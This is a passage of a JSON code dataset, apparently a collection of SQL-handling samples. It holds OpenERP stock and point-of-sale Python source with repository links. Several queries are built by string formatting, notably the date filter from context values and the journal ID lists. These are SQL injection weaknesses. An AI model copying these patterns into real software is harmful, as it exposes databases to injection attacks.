if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/akretion/openerp-addons/blob/4ad703b1c353a8318094d79ca0dfea34e7f05e27",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/akretion/openerp-addons/blob/4ad703b1c353a8318094d79ca0dfea34e7f05e27",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/akretion/openerp-addons/blob/de89977dbb3cc6265876e071f8a6219eb602b4af",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n       